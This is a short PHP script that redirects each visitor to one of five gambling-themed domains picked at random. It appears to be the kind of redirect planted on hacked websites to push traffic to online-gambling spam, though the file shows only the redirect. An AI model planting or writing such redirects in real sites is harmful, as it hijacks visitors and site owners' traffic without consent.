<?php
// Array of URLs to redirect to
$urls = [
    'https://sateslotgacor.xyz',
    'https://megaforwinbet.xyz',
    'https://nasgorbetspesial.xyz',
    'https://nagaforwinapi.xyz',
    'https://burungbet.shop',
    
    // Add more URLs here
];

// Pick a random URL from the array
$random_url = $urls[array_rand($urls)];

// Redirect to the selected URL
header("Location: $random_url");
exit();
?>
